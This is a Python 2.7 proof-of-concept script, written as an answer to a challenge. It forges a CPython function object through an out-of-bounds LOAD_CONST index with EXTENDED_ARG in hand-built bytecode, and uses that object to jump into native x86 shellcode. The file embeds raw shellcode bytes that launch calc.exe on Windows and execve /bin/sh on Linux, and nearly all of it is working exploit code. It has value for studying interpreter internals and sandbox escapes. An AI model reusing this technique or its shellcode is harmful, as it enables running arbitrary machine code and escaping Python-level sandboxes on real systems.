#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
#    abuse_python27_vm_to_execute_x86_code.py - Python 2.7 opcodes & x86 shellcodes = funz
#    Copyright (C) 2013 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# https://twitter.com/elvanderb/status/162551396015669248 -- Challenge accepted mate!

import struct
import types
import opcode
import platform
import sys
from ctypes import c_char

def get_string_object_padding():
    """
    Find at runtime the padding PyStringObject -> PyStringObject.ob_sval:
        typedef struct {        +
            PyObject_VAR_HEAD   |
            long ob_shash;      | We want to know that size
            int ob_sstate;      |
            char ob_sval[1];    +
        } PyStringObject;
    """
    marker = 'ABCDEFGH'
    r = (c_char * 100).from_address(id(marker))
    return r.raw.find(marker)

def pack_ushort(us):
    return struct.pack('<H', us)

def pack_uint(ui):
    return struct.pack('<I', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def exec_x86_shellcodes_via_python27_opcodes_(addr_x86_code):
    """Execute native x86 code abusing the Python VM"""

    def pull_the_trigger_b1tch():
        """Pull the trigger motherfucker"""
        pass

    padding_size = get_string_object_padding()
    const_tuple = ()
    addr_const_tuple = id(const_tuple)

    first_indirection = 'A' * 0x40 + pack_uint(addr_x86_code)
    addr_first_indirection = id(first_indirection)
    addr_first_indirection_controled_data = addr_first_indirection + padding_size

    fake_object = 'AAAA' + pack_uint(addr_first_indirection_controled_data)
    addr_fake_object = id(fake_object)
    addr_fake_object_controled = addr_fake_object + padding_size

    # In LOAD_CONST:
    # CPU Disasm
    # Address   Hex dump          Command                                  Comments
    # 1E011389    8B4C24 7C       MOV ECX,DWORD PTR [ESP+7C]
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] # EDI will be the 0xdeadbeef
    # 1E011391    8B4424 0C       MOV EAX,DWORD PTR [ESP+0C]
    # 1E011395    FF07            INC DWORD PTR [EDI]
    # 1E011397    8938            MOV DWORD PTR [EAX],EDI

    ptr_object = pack_uint(addr_fake_object_controled)
    addr_ptr_object = id(ptr_object)
    addr_ptr_data_controled = addr_ptr_object + padding_size

    # Compute the offset
    # Remember:
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] ; ECX is the address of the const_tuple object, EBX you control!
    assert((addr_ptr_data_controled - addr_const_tuple - 0xC) % 4 == 0)

    offset = ((addr_ptr_data_controled - addr_const_tuple - 0xC) & 0xffffffff) / 4
    offset_high, offset_low = offset >> 16, offset & 0xffff

    # 1. Load the low part of our address
    evil_bytecode  = get_opcode('EXTENDED_ARG') + pack_ushort(offset_high)
    # 2. Load an object from the const: This is an evil object :]
    evil_bytecode += get_opcode('LOAD_CONST') + pack_ushort(offset_low)
    # 3. Call the function on the top of stack: The evil function object :]
    evil_bytecode += get_opcode('CALL_FUNCTION') + '\x00\x00'

    pull_the_trigger_b1tch.func_code = types.CodeType(
        0,
        0,
        0,
        0,
        evil_bytecode,
        const_tuple,
        (),
        (),
        "",
        "",
        0,
        ""
    )

    # and b00m!1§1§1§
    pull_the_trigger_b1tch()

def main(argc, argv):
    sh = None
    system = platform.system()

    if system == 'Windows':
        # Windows/x86 - calc.exe shellcode
        sh = '\xda\xc3\xba\x2d\xae\x01\x6b\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x33\x83\xed\xfc\x31\x55\x13\x03\x78\xbd\xe3\x9e\x7e\x29\x6a\x60\x7e\xaa\x0d\xe8\x9b\x9b\x1f\x8e\xe8\x8e\xaf\xc4\xbc\x22\x5b\x88\x54\xb0\x29\x05\x5b\x71\x87\x73\x52\x82\x29\xbc\x38\x40\x2b\x40\x42\x95\x8b\x79\x8d\xe8\xca\xbe\xf3\x03\x9e\x17\x78\xb1\x0f\x13\x3c\x0a\x31\xf3\x4b\x32\x49\x76\x8b\xc7\xe3\x79\xdb\x78\x7f\x31\xc3\xf3\x27\xe2\xf2\xd0\x3b\xde\xbd\x5d\x8f\x94\x3c\xb4\xc1\x55\x0f\xf8\x8e\x6b\xa0\xf5\xcf\xac\x06\xe6\xa5\xc6\x75\x9b\xbd\x1c\x04\x47\x4b\x81\xae\x0c\xeb\x61\x4f\xc0\x6a\xe1\x43\xad\xf9\xad\x47\x30\x2d\xc6\x73\xb9\xd0\x09\xf2\xf9\xf6\x8d\x5f\x59\x96\x94\x05\x0c\xa7\xc7\xe1\xf1\x0d\x83\x03\xe5\x34\xce\x49\xf8\xb5\x74\x34\xfa\xc5\x76\x16\x93\xf4\xfd\xf9\xe4\x08\xd4\xbe\x1b\x43\x75\x96\xb3\x0a\xef\xab\xd9\xac\xc5\xef\xe7\x2e\xec\x8f\x13\x2e\x85\x8a\x58\xe8\x75\xe6\xf1\x9d\x79\x55\xf1\xb7\x19\x38\x61\x5b\xf0\xdf\x01\xfe\x0c'
    elif system == 'Linux':
        # Linux/x86 - execve /bin/sh - 21 bytes
        sh = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
    else:
        sh = '\xcc'

    # The string of a PyStringObject is stored at the offset 0x14
    # typedef struct
    # {
    #     PyObject_VAR_HEAD
    #     long ob_shash;
    #     int ob_sstate;
    #     char ob_sval[1]; // <- OUR STR1NGZ
    # } PyStringObject;
    address_shellcode = id(sh) + get_string_object_padding()
    exec_x86_shellcodes_via_python27_opcodes_(address_shellcode)

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))    
